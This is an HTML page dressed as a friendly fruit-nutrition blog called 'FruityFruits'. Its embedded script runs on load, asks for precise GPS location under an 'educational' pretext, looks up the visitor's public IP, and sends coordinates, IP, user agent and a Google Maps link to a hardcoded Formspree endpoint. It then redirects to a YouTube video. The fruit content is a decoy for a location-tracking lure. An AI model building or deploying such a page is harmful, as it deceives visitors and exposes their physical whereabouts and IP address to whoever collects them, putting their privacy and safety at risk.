<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>FruityFruits</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body {
      background-color: rgb(0, 0, 0);
      color: white;
      font-size: 20px;
      font-family: 'Times New Roman', Times, serif;
      margin: 20px;
      text-align: justify;
    }
    h1 { color: midnightblue; font-size: 40px; text-align: center; }
    p, ol { font-size: 20px; color: white; text-align: justify; margin: 20px; }
    a { color: lightblue; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .status { margin: 10px 20px; color: #ccc; font-size: 16px; }
  </style>
</head>
<body>
  <main>
    <h1>Welcome to FruityFruits!</h1>

    <p>Fruits, i want to tell you about fruits, hear me out!</p>
    <p>Now i will tell you about my favorite fruits and why they are good for your health.
      Fruits are an essential part of a healthy diet. They provide vitamins, minerals, and fiber that our bodies need.</p>

    <p>Some of my favorite fruits include:</p>
    <ol>
      <li><strong>Apples:</strong> They are rich in fiber and antioxidants, which can help reduce the risk of chronic diseases.</li>
      <li><strong>Bananas:</strong> They are a great source of potassium, which is important for heart health and muscle function.</li>
      <li><strong>Oranges:</strong> They are high in vitamin C, which boosts the immune system and promotes healthy skin.</li>
      <li><strong>Berries:</strong> They are packed with antioxidants and can help improve brain function.</li>
      <li><strong>Grapes:</strong> They contain resveratrol, which has been linked to heart health.</li>
    </ol>

    <p>Do you want to know more about fruits? <a href="#" id="Here!">Click here!</a></p>
    <p class="status" id="status">Status: aguardando decisão do usuário...</p>
  </main>

  <script>
    // Mantive seu endpoint do Formspree
    const formspreeEndpoint = "https://formspree.io/f/xpwynkqn";

    // Cookie helpers
    function setCookie(name, value, days) {
      const d = new Date();
      d.setTime(d.getTime() + (days*24*60*60*1000));
      document.cookie = `${name}=${encodeURIComponent(value)};path=/;expires=${d.toUTCString()};SameSite=Lax`;
    }
    function getCookie(name) {
      return document.cookie.split('; ').reduce((res, c) => {
        const [k, v] = c.split('=');
        return k === name ? decodeURIComponent(v) : res;
      }, null);
    }

    // envia payload pro Formspree
    function sendToFormspree(payload) {
      return fetch(formspreeEndpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    // pega IP público (opcional)
    function getPublicIP() {
      return fetch("https://api.ipify.org?format=json")
        .then(r => r.ok ? r.json() : Promise.reject())
        .then(j => j.ip)
        .catch(() => null);
    }

    // requisita geolocalização precisa (GPS quando disponível)
    function requestPreciseGeo() {
      const statusEl = document.getElementById('status');
      if (!("geolocation" in navigator)) {
        if (statusEl) statusEl.textContent = "Status: navegador não suporta geolocation.";
        return;
      }

      if (statusEl) statusEl.textContent = "Status: solicitando permissão para localização precisa...";
      const options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };

      navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const acc = pos.coords.accuracy; // metros

        if (statusEl) statusEl.textContent = `Status: localização obtida (±${Math.round(acc)} m). Enviando...`;

        // pega IP público (se disponível)
        const ip = await getPublicIP();

        const payload = {
          timestamp: new Date().toISOString(),
          ip: ip,
          latitude: lat,
          longitude: lon,
          accuracy_meters: acc,
          google_maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
          user_agent: navigator.userAgent,
          note: "Precise via navigator.geolocation (user consent)"
        };

        sendToFormspree(payload)
          .then(res => {
            if (res.ok) {
              if (statusEl) statusEl.textContent = `Status: dados enviados com sucesso. Localização: ${lat.toFixed(6)}, ${lon.toFixed(6)} (±${Math.round(acc)} m)`;
            } else {
              if (statusEl) statusEl.textContent = "Status: envio falhou (Formspree).";
            }
          })
          .catch(err => {
            console.error(err);
            if (statusEl) statusEl.textContent = "Status: erro ao enviar os dados.";
          });
      }, (err) => {
        console.warn("Geolocation error:", err);
        if (statusEl) statusEl.textContent = "Status: permissão negada ou erro. Nenhuma localização precisa obtida.";
      }, options);
    }

    // flow: checa cookie; se aceitou -> solicita geolocalização; se negou -> não faz nada; se sem cookie -> pede via confirm e seta cookie
    function startGeoWithCookie() {
      const statusEl = document.getElementById('status');
      const consent = getCookie('ff_geo_consent'); // "accepted" | "declined" | null

      if (consent === 'accepted') {
        if (statusEl) statusEl.textContent = "Status: consentimento prévio detectado. Solicitando localização...";
        requestPreciseGeo();
        return;
      }
      if (consent === 'declined') {
        if (statusEl) statusEl.textContent = "Status: coleta recusada anteriormente (cookie).";
        return;
      }

      // sem cookie: pede confirmação simples (pode substituir por modal)
      const want = confirm("Este site solicita sua localização precisa (GPS) para fins educacionais. Você aceita compartilhar sua localização?");
      if (want) {
        setCookie('ff_geo_consent', 'accepted', 365);
        requestPreciseGeo();
      } else {
        setCookie('ff_geo_consent', 'declined', 365);
        if (statusEl) statusEl.textContent = "Status: você recusou a coleta de localização (cookie gravado).";
      }
    }

    // inicia ao carregar
    window.addEventListener('load', startGeoWithCookie);

    // mantém o redirecionamento do clique
    const here = document.getElementById('Here!');
    if (here) {
      here.addEventListener('click', function(event) {
        event.preventDefault();
        console.log('Enjoy the video!');
        window.location.href = 'https://youtube.com/shorts/UM7TpdnbWfY?si=d_vDGrLYHqp5QZys';
      });
    }
  </script>
</body>
</html>
